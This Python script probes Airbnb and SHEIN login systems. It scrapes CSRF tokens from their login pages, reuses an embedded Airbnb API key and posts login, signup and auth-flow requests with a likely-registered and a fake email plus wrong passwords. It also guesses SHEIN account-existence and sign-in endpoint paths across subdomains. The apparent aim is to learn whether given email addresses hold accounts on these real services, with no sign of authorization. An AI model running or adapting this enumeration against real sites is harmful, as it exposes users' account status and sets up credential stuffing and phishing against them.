"""Get CSRF tokens and test with proper auth for Airbnb & find real SHEIN API."""
import requests
import json
import re

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
email_exists = "test@gmail.com"      # likely exists
email_fake = "xyzfake99887766@gmail.com"  # likely does NOT exist

def show(label, r):
    print(f"\n  [{r.status_code}] {label}")
    try:
        d = r.json()
        print(f"       {json.dumps(d)[:400]}")
    except:
        print(f"       {r.text[:250]}")

# ===================== AIRBNB with CSRF =====================
print("=" * 60)
print("  AIRBNB - With CSRF Token")
print("=" * 60)

s = requests.Session()
s.headers.update({"User-Agent": UA})

# Step 1: Get main page
r = s.get("https://www.airbnb.com", timeout=15)
API_KEY = "d306zoyjsyarp7ifhu67rjxn52tv0t20"

# Step 2: Extract CSRF token from cookies or page
csrf_from_page = re.findall(r'"csrf[Tt]oken"\s*:\s*"([^"]+)"', r.text)
csrf_from_meta = re.findall(r'name="csrf-token"\s+content="([^"]+)"', r.text)
csrf_from_cookie = s.cookies.get("_csrf_token", "")

print(f"  CSRF from page JS: {csrf_from_page[:2]}")
print(f"  CSRF from meta: {csrf_from_meta[:2]}")
print(f"  CSRF from cookie: {csrf_from_cookie[:40]}")
print(f"  All cookies: {list(s.cookies.keys())}")

# Step 3: Visit login page specifically
r2 = s.get("https://www.airbnb.com/login", timeout=15)
csrf_login = re.findall(r'"csrf[Tt]oken"\s*:\s*"([^"]+)"', r2.text)
csrf_meta2 = re.findall(r'name="csrf-token"\s+content="([^"]+)"', r2.text)
authenticity = re.findall(r'authenticity_token["\s:=]+([a-zA-Z0-9_\-/+=]{20,})', r2.text)

print(f"\n  Login page CSRF JS: {csrf_login[:2]}")
print(f"  Login page meta: {csrf_meta2[:2]}")
print(f"  Authenticity tokens: {authenticity[:2]}")
print(f"  Cookies after login page: {list(s.cookies.keys())}")

# Also look for bootstrap data
bootstrap = re.findall(r'"bootstrapData"\s*:\s*\{[^}]*"csrfToken"\s*:\s*"([^"]+)"', r2.text)
if bootstrap:
    print(f"  Bootstrap CSRF: {bootstrap[0][:40]}")

# Try to find ANY token patterns
all_tokens = re.findall(r'"([a-zA-Z]*[Tt]oken[a-zA-Z]*)"\s*:\s*"([^"]{20,80})"', r2.text)
if all_tokens:
    print(f"  All token fields found:")
    for name, val in all_tokens[:5]:
        print(f"    {name} = {val[:50]}")

# Use whatever CSRF we found
csrf = ""
if csrf_login:
    csrf = csrf_login[0]
elif csrf_from_page:
    csrf = csrf_from_page[0]
elif csrf_meta2:
    csrf = csrf_meta2[0]
elif authenticity:
    csrf = authenticity[0]

print(f"\n  Using CSRF: {csrf[:50]}...")

hdrs = {
    "User-Agent": UA,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Origin": "https://www.airbnb.com",
    "Referer": "https://www.airbnb.com/login",
    "X-Airbnb-Api-Key": API_KEY,
    "X-Airbnb-Supports-Airlock-V2": "true",
    "X-CSRF-Token": csrf,
    "X-CSRFToken": csrf,
    "X-CSRF-Without-Token": "1",
}

# Test login_for_web with CSRF - with EXISTING email
print("\n-- Testing with likely existing email --")
r3 = s.post(f"https://www.airbnb.com/api/v2/login_for_web?key={API_KEY}",
            headers=hdrs, json={"email": email_exists, "password": "wrongpass123!"}, timeout=15)
show(f"login_for_web ({email_exists})", r3)

# Test with FAKE email
r4 = s.post(f"https://www.airbnb.com/api/v2/login_for_web?key={API_KEY}",
            headers=hdrs, json={"email": email_fake, "password": "wrongpass123!"}, timeout=15)
show(f"login_for_web ({email_fake})", r4)

# Test auth_flows with different body formats
print("\n-- Testing auth_flows --")
for payload in [
    {"email": email_exists, "flow": "login"},
    {"email": email_exists, "type": "login"},
    {"input": {"email": email_exists}},
    {"email": email_exists},
]:
    r5 = s.post(f"https://www.airbnb.com/api/v2/auth_flows?key={API_KEY}",
                headers=hdrs, json=payload, timeout=15)
    show(f"auth_flows body={json.dumps(payload)[:80]}", r5)

# Test signup_for_web with CSRF
r6 = s.post(f"https://www.airbnb.com/api/v2/signup_for_web?key={API_KEY}",
            headers=hdrs, json={"email": email_exists, "password": "TestPass123!", "first_name": "John", "last_name": "Doe", "birthday": "1990-01-15"},
            timeout=15)
show(f"signup_for_web ({email_exists})", r6)


# ===================== SHEIN - Find real API =====================
print("\n\n" + "=" * 60)
print("  SHEIN - Finding Real API Domain")
print("=" * 60)

s2 = requests.Session()
s2.headers.update({"User-Agent": UA, "Accept-Encoding": "gzip, deflate"})

# Get SHEIN login page
r = s2.get("https://ma.shein.com/user/auth/login", timeout=15)
print(f"  Page URL: {r.url}")

# Search for API base URLs in the page
api_bases = re.findall(r'https?://[a-z0-9\-]+\.shein\.com/[a-z/]*api', r.text)
api_hosts = re.findall(r'(https?://[a-z0-9\-]+\.shein\.com)', r.text)
unique_hosts = list(set(api_hosts))
print(f"  SHEIN hosts found: {unique_hosts[:15]}")

# Look for API configuration
api_config = re.findall(r'"apiBaseUrl"\s*:\s*"([^"]+)"', r.text)
api_config2 = re.findall(r'"baseURL"\s*:\s*"([^"]+)"', r.text)
api_config3 = re.findall(r'apiHost["\s:=]+(["\']?)([a-zA-Z0-9:/.\-]+)\1', r.text)
print(f"  apiBaseUrl: {api_config}")
print(f"  baseURL: {api_config2}")
print(f"  apiHost: {api_config3[:5]}")

# Look for langPath or site prefix that might be used in API
lang_path = re.findall(r'"langPath"\s*:\s*"([^"]*)"', r.text)
site_code = re.findall(r'"siteCode"\s*:\s*"([^"]*)"', r.text)
print(f"  langPath: {lang_path}")
print(f"  siteCode: {site_code}")

# The CSRF token
csrf_shein = re.findall(r'name="csrf-token"\s+content="([^"]+)"', r.text)
if not csrf_shein:
    csrf_shein = re.findall(r'"csrfToken"\s*:\s*"([^"]+)"', r.text)
if not csrf_shein:
    csrf_shein = re.findall(r'csrf[_-]?[Tt]oken["\s:=]+([a-zA-Z0-9_\-]{20,})', r.text)
print(f"  CSRF: {csrf_shein[0][:40] if csrf_shein else 'NOT FOUND'}")

csrf_s = csrf_shein[0] if csrf_shein else ""

# Try different URL patterns with the correct domain
shdrs = {
    "User-Agent": UA,
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://ma.shein.com",
    "Referer": "https://ma.shein.com/user/auth/login",
    "X-Requested-With": "XMLHttpRequest",
    "X-CSRF-Token": csrf_s,
    "csrf-token": csrf_s,
}

# Try the endpoints with different URL patterns
print("\n-- Testing SHEIN email check patterns --\n")

patterns = [
    "/api/auth/chekAccountExist",
    "/gw/auth/chekAccountExist",
    "/api/auth/checkAccountExist",
    "/gw/auth/checkAccountExist",
    "/api/user/auth/chekAccountExist",
    "/restApi/auth/chekAccountExist",
]

for p in patterns:
    for domain in ["https://ma.shein.com", "https://us.shein.com"]:
        r = s2.post(f"{domain}{p}", headers=shdrs, json={"email": email_exists, "alias": email_exists}, timeout=10)
        if r.status_code != 404:
            show(f"{domain}{p}", r)

# Try emailSignin on different subdomains
print("\n-- Testing SHEIN emailSignin --\n")
signin_patterns = [
    "/api/auth/emailSignin",
    "/gw/auth/emailSignin",
    "/api/members/signin",
    "/gw/members/signin",
]
for p in signin_patterns:
    for domain in ["https://ma.shein.com", "https://us.shein.com"]:
        r = s2.post(f"{domain}{p}", headers=shdrs,
                    json={"email": email_exists, "password": "wrong123!"}, timeout=10)
        if r.status_code != 404:
            show(f"{domain}{p}", r)

print("\n" + "=" * 60)
print("  DONE")
print("=" * 60)
